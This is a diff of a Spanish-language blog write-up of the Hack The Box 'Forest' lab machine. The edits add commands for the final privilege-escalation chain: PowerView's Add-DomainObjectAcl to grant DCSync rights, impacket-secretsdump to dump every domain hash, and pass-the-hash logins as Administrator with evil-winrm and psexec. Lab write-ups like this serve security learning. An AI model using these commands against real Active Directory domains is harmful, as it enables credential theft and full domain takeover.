@@ -1,6 +1,6 @@
 ---
 title: Forest - Hack The Box
-categories: [Windows,]
+categories: [Windows, Domain Controller, DC, Active Directory, AD, LDAP, ldapsearch, AS-REP Roasting, Kerberos, GetNPUsers, Impacket, RPC, rpcclient, John the Ripper, WinRM, Windows Remote Management, CrackMapExec, Evil-WinRM, SharpHound, BloodHound, ccount Operators, WriteDacl, DCSync, MS-DRSR, PowerView, PowerSploit, Add-DomainObjectAcl, secretsdump, Pass the Hash, PtH, psexec]
 published: true
 lang: es
 ---
@@ -214,7 +214,7 @@ Lo primero que haremos será descargar [SharpHound](https://github.com/puckiesty
 upload SharpHound.ps1
 ```
 
-Una vez subido, importaremos y utilizaremos el método `Invoke-BloodHound` para recolectar toda la información necesaria.
+Una vez subido, importaremos y utilizaremos la función `Invoke-BloodHound` para recolectar toda la información necesaria.
 
 ```powershell
 Import-Module .\SharpHound.ps1
@@ -289,20 +289,45 @@ net group "Exchange Windows Permissions" nombreUsuario /add
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}
 
-Finalmente, para otorgarnos permisos de `DCsync`, podemos apoyarnos en `BloodHound`, que nos da una idea de cómo realizarlo. 
-
-Lo primero que haremos será descargar en nuestro equipo el script [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), que pertenece a PowerSploit (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante Evil-WinRM y posteriormente lo importaremos:
+Finalmente, para otorgarnos permisos de `DCsync`, podemos apoyarnos en `BloodHound`, que nos da una idea de cómo realizarlo. Lo primero que haremos será descargar en nuestro equipo el script [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), que pertenece a `PowerSploit` (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante `Evil-WinRM` y posteriormente lo importaremos:
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}
 
+```powershell
+upload PowerView.ps1
+Import-Module .\PowerView.ps1
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}
+
+Una vez importado, utilizaremos la función `Add-DomainObjectAcl` para otorgar permisos de `DCsync` a nuestro usuario recién creado:
+
+```bash
+Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity nombreDeUsuario -Rights DCSync
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
 
+Ya con permisos de `DCsync` en nuestro usuario, podemos utilizar `secretsdump`, otro script de la suite de `Impacket` que nos permitirá dumpear los hashes de todos los usuarios del dominio:
+
+```bash
+impacket-secretsdump htb.local/nombreUsuario:contraseña@10.10.10.161
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
 
+Finalmente, podemos realizar un ataque de tipo `Pass the Hash`, que consiste en usar el _hash_ que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar `psexec` (otro script de `Impacket`), o bien, mediante el mismo `Evil-WinRM`:
+
+```bash
+evil-winrm -i 10.10.10.161 -u 'Administrator' -H 'HASH'
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"}
+
+```bash
+impacket-psexec administrator@10.10.10.161 -hash HASH
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"}
